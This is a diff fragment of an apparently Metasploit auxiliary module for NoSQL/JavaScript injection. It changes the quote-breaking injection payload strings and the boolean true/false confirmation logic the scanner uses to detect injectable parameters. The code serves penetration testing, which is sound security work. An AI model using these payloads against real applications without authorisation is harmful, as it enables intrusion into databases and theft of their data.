@@ -33,10 +33,10 @@ class Metasploit4 < Msf::Auxiliary
   end
 
   def syntaxes
-    [['";return+true;var+foo="', '";return+[inject];var+foo="'],
-     ["';return+true;var+foo='", "';return+[inject];var+foo='"],
-     ["'||this||'", "'||[inject]||'"],
-     ['"||this||"','"||[inject]||"'],
+    [["\"'||this||'", "'||[inject]||'"],
+     ["\"';return+true;var+foo='", "';return+[inject];var+foo='"],
+     ['\'"||this||"','"||[inject]||"'],
+     ['\'";return+true;var+foo="', '";return+[inject];var+foo="'],
      ["||this","||[inject]"]]
   end
 
@@ -64,17 +64,17 @@ class Metasploit4 < Msf::Auxiliary
       if res and res.body != fals and res.code == 200
         print_status("Looks like " + payload[0] + " works")
         tru = res.body
-      end
 
-      res = send_request_cgi({
-        'uri' => uri.sub('[NoSQLi]', payload[0].sub('true', 'false').sub('this', '!this'))
-      })
+        res = send_request_cgi({
+          'uri' => uri.sub('[NoSQLi]', payload[0].sub('true', 'false').sub('this', '!this'))
+        })
 
-      if res and res.body != tru and res.code == 200
-        vprint_status("I think I confirmed with a negative test.")
-        fals = res.body
-        pay = payload[1]
-        break
+        if res and res.body != tru and res.code == 200
+          vprint_status("I think I confirmed with a negative test.")
+          fals = res.body
+          pay = payload[1]
+          break
+        end
       end
     end
 
